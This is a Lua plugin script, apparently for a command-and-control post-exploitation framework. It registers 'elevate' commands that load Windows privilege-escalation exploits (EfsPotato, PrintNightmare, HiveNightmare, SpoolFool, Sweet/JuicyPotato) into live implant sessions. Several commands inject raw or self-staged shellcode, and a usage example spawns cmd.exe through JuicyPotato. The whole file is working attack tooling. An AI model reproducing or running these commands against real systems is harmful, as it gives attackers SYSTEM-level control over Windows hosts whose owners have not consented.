local function new_sac()
    local sac = new_sacrifice(0, false, false, false, "")
    return sac
end

-- start EfsPotato_Net3.5.exe
local function run_EfsPotato_Net35_Command(args)
    if #args < 1 then error("Usage: EfsPotato_Net3.5 <cmd>") end
    local session = active()
    local efspotato_path = "Elevate/EfsPotato_Net3.5.exe"
    return execute_assembly(session, script_resource(efspotato_path), args,
                            true, new_sac())
end
command("elevate:EfsPotato_Net3.5_Command", run_EfsPotato_Net35_Command,
        "Usage: EfsPotato_Net3.5_Command <cmd>", "T1068")
-- end EfsPotato_Net3.5.exe

-- start EfsPotato_Net3.5_CS.exe todo
local function run_EfsPotato_Net35_Shellcode(cmd)
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local shellcode
    local session = active()
    if shellcode_file ~= "" then
        shellcode_handle = io.open(shellcode_file, "rb")
        if shellcode_handle == nil then
            error("open shellcode file failed")
        end
        shellcode = shellcode_handle:read("*all")
        shellcode_handle:close()
    else
        shellcode = self_stager(session)
    end
    local efspotato_path = "Elevate/EfsPotato_Net3.5_CS.exe"
    local b64_shellcode = base64_encode(shellcode)
    return execute_assembly(session, script_resource(efspotato_path),
                            {b64_shellcode}, true, new_sac())
end
local cmd_EfsPotato_Net35_Shellcode = command(
                                          "elevate:EfsPotato_Net3.5_Shellcode",
                                          run_EfsPotato_Net35_Shellcode,
                                          "Usage: elevate EfsPotato_Net35_Shellcode \n --shellcode_file <shellcode_file>",
                                          "T1068")
cmd_EfsPotato_Net35_Shellcode:Flags():String("shellcode_file", "",
                                             "Path to the raw shellcode file. If not set, the script will use the self_stager function to generate the shellcode.")
-- end EfsPotato_Net3.5_CS.exe

-- start EfsPotato_Net4.exe
local function run_EfsPotato_Net40_Command(args)
    if #args ~= 1 then error("Usage: EfsPotato_Net4.0 <cmd>") end
    local session = active()
    local efspotato_path = "Elevate/EfsPotato_Net4.0.exe"
    return execute_assembly(session, script_resource(efspotato_path), args,
                            true, new_sac())
end
command("elevate:EfsPotato_Net4.0_Command", run_EfsPotato_Net40_Command,
        "Usage: elevate EfsPotato_Net4.0_Command <cmd>", "T1068")
-- end EfsPotato_Net4.exe

-- SharpHiveNightmare_Net4.exe
local function run_SharpHiveNightmare_Net40()
    local session = active()
    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.0.exe"
    return execute_assembly(session, script_resource(sharphivenightmare_path),
                            {}, true, new_sac())
end
command("elevate:SharpHiveNightmare_Net4.0", run_SharpHiveNightmare_Net40,
        "SharpHiveNightmare_Net40", "T1068")
-- end SharpHiveNightmare_Net4.exe

-- SharpHiveNightmare_Net4.5.exe
local function run_SharpHiveNightmare_Net45()
    local session = active()
    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.5.exe"
    return execute_assembly(session, script_resource(sharphivenightmare_path),
                            {}, true, false, false)
end
command("elevate:SharpHiveNightmare_Net4.5", run_SharpHiveNightmare_Net45,
        "SharpHiveNightmare_Net45", "T1068")
-- end SharpHiveNightmare_Net4.5.exe

-- SharpPrintNightmare_Net4.exe
local function run_SharpPrintNightmare_Net40(args)
    local session = active()
    local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.0.exe"
    return execute_assembly(session, script_resource(sharpprintnightmare_path),
                            args, true, false, false)
end
command("elevate:SharpPrintNightmare_Net4.0", run_SharpPrintNightmare_Net40,
        "SharpPrintNightmare_Net40", "T1068")
-- end SharpPrintNightmare_Net4.exe

-- SharpPrintNightmare_Net4.5.exe
local function run_SharpPrintNightmare_Net45()
    local session = active()
    local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.5.exe"
    return execute_assembly(session, script_resource(sharpprintnightmare_path),
                            {}, true, false, false)
end
command("elevate:SharpPrintNightmare_Net4.5", run_SharpPrintNightmare_Net45,
        "SharpPrintNightmare_Net45", "T1068")
-- end SharpPrintNightmare_Net4.5.exe

-- SpoolFool_Net4.exe
local function run_SpoolFool_Net40()
    local session = active()
    local spoolfool_path = "Elevate/SpoolFool_Net4.exe"
    return execute_assembly(session, script_resource(spoolfool_path), {}, true,
                            false, false)
end
command("elevate:SpoolFool_Net4.0", run_SpoolFool_Net40, "SpoolFool_Net40",
        "T1068")
-- end SpoolFool_Net4.exe

-- SweetPotato4-46.exe
local function run_SweetPotato_NET46(args)
    if #args < 1 then error("args required") end
    local session = active()
    local sweetpotato_path = "Elevate/SweetPotato_NET4-46.exe"
    return execute_assembly(session, script_resource(sweetpotato_path), args,
                            true, new_sac())
end
command("elevate:SweetPotato4-46", run_SweetPotato_NET46, "SweetPotato4-46", "")
-- end SweetPotato4-46.exe

-- SweetPotato_CS.exe todo
local function run_SweetPotato_CS(cmd)
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local shellcode
    local session = active()
    if shellcode_file ~= "" then
        shellcode_handle = io.open(shellcode_file, "rb")
        if shellcode_handle == nil then
            error("open shellcode file failed")
        end
        shellcode = shellcode_handle:read("*all")
        shellcode_handle:close()
    else
        shellcode = self_stager(session)
    end
    local sweetpotato_path = "Elevate/SweetPotato_CS.exe"
    local b64_shellcode = base64_encode(shellcode)
    local args = {
        "-l", "12333", "-p", "c:\\windows\\system32\\cmd.exe", "-s",
        b64_shellcode
    }
    return execute_assembly(session, script_resource(sweetpotato_path), args,
                            true, new_sac())
end

local cmd_SweetPotato_CS = command("elevate:SweetPotato_CS", run_SweetPotato_CS,
                                   "SweetPotato_CS", "")
cmd_SweetPotato_CS:Flags():String("shellcode_file", "",
                                  "Path to the raw shellcode file. If not set, the script will use the self_stager function to generate the shellcode.")

local function run_JuicyPotato(args)
    local session = active()
    local arch = session.Os.Arch
    local juicypotato_path = "Elevate/JuicyPotato_Net2.0.exe"
    return execute_exe(session, script_resource(juicypotato_path), args, true,
                       6, arch, "", new_sac())
end
command("elevate:JuicyPotato", run_JuicyPotato, [[
elevate JuicyPotato <args>
~~~
elevate JuicyPotato -- -t t -p "c:\windows\system32\cmd.exe" -l 1111 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
~~~]], "")
